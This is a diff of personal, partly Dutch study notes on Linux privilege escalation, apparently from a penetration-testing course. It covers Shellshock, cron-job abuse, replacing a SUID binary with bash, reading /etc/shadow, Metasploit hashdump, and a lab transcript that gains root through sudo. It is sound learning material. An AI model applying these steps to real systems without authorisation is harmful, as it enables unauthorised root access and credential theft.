@@ -19,7 +19,6 @@ CVE-2014-6271 - Shellshock:
 - Shellshock (CVE-2014-6271) is a family of vulnerabilities in the Bash shell (since V1.3) that allows an attacker to execute remote arbitrary commands via Bash, leading to potential remote access to the target system via a reverse shell.
 - The Shellshock vulnerability was discovered by Stéphane Chazelas on September 12, 2014, and publicly disclosed on September 24, 2014.
 - Bash is a \*Nix shell that is part of the GNU project and serves as the default shell for most Linux distributions.
-
 - The Shellshock vulnerability occurs due to a flaw in Bash, where Bash mistakenly executes trailing commands after a series of characters: "() {:;};"
 	- als deze characters in bash worden ingevoerd dan wordt alles erna ook excuted door bash. 
 - This vulnerability specifically affects Linux systems, as Windows does not use Bash since it is not a \Nix-based operating system.
@@ -435,20 +434,21 @@ following compiler can be used to compile exploit code written in C: GCC
 
 voorwerk 
 - Whoami 
-- groups 
+- groups  user -> groups student 
 - cat /etc/passwd 
 
-identify cron jobs 
-- contab -l 
-- list content of user home directory (ls -al)
-- when you see file that is owned by root account: try to identify where the file is stored using a grep utility 
-	- grep -rnw /usr -e "/home/student/message" 
+identify cron jobs to gain sudo permissions 
+- crontab -l 
+- list content of user home directory ~: **ls -al**  
+- when you see a file that is owned by root account: try to identify where the file is stored using a grep utility 
+	- grep -rnw /user -e "/home/student/message" 
 		    - `-r` (or `--recursive`): This option tells `grep` to search recursively in all subdirectories of the specified directory.
 		    - `-n` (or `--line-number`): This option prints the line numbers along with the matched lines.
 		    - `-w` (or `--word-regexp`): This option ensures that only whole words are matched. It prevents partial matches.
 		-  `/usr`: This is the directory where the search will start. In this case, it's the root directory `/usr`, which is a common location for system files in Unix-like systems 		    
 		- `-e`: This option is used to specify the pattern or string to search for. In this case, the pattern being searched for is `"/home/student/message"`.
 		- The command will search for the pattern `"/home/student/message"` within files in the `/usr` directory and its subdirectories. It will display the matching lines along with their line numbers. 
+		  ![[Pasted image 20230718084352.png]]
 	- The grep search will give the path /file \ location where it is copied \ destination 
 		- list out the destination where the file is copies to (cat)
 		- you cant continue... 
@@ -477,6 +477,59 @@ In een notendop:
 3. modified the script where we added a command that adds the unprivileged user to the sudoers file 
 
 
+--- Lab ---- 
+
+*Your mission is to get a root shell on the box and retrieve the flag!*
+
+student@attackdefense:/$ grep -rnw /usr -e "/home/student/message"
+/usr/local/share/copy.sh:2:cp /home/student/message /tmp/message 
+
+student@attackdefense:/$
+student@attackdefense:/$ sudo -l
+Matching Defaults entries for student on attackdefense:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User student may run the following commands on attackdefense:
+    (root) NOPASSWD: /etc/init.d/cron
+    (root) NOPASSWD: ALL
+    (root) NOPASSWD: ALL
+student@attackdefense:/$ whoami
+student
+student@attackdefense:/$ crontab -l
+no crontab for student
+student@attackdefense:/$ sudo su
+root@attackdefense:/# whoami
+root
+root@attackdefense:/# crontab -l
+*/01 * * * * sh /usr/l 
+
+root@attackdefense:/# sudo bin/bash
+root@attackdefense:/# cd tmp
+root@attackdefense:/tmp# ls -a
+.  ..  message
+root@attackdefense:/tmp# cat message
+Hey!! you are not root :(
+root@attackdefense:/tmp# sudo cat message
+Hey!! you are not root :(
+root@attackdefense:/tmp# cd /root/
+root@attackdefense:~# ls -a
+.  ..  .bashrc  .profile  flag
+root@attackdefense:~# cat flag
+697914df7a07bb9b718c8ed258150164
+root@attackdefense:~#
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 ## Exploiting SUID Binaries 
@@ -503,14 +556,17 @@ SUID (Set Owner User ID) Permissions:
 	- file welcome (see more information about the binary)
 	- strings welcome (list of string within the binary)
 	- find something to use 
-
 - rm greetings 
 - create own greetings binary: cp /bin/bash greetings 
 	- ![[Pasted image 20230713124512.png]]
 
 
+--- Lab --- 
 
-
+**Your mission:**
+1. Get as root shell on the system
+2. View /etc/shadow
+3. Retrieve the flag
 
 
 
@@ -577,7 +633,9 @@ Andere manier is met hashdump module
 - post/linux.gather/hashdump module 
 - set session 2 (meterpreter session) 
 - give you hashed passwords and save them in a txt for you 
-- 
+- ... 
+
+
 
 
 
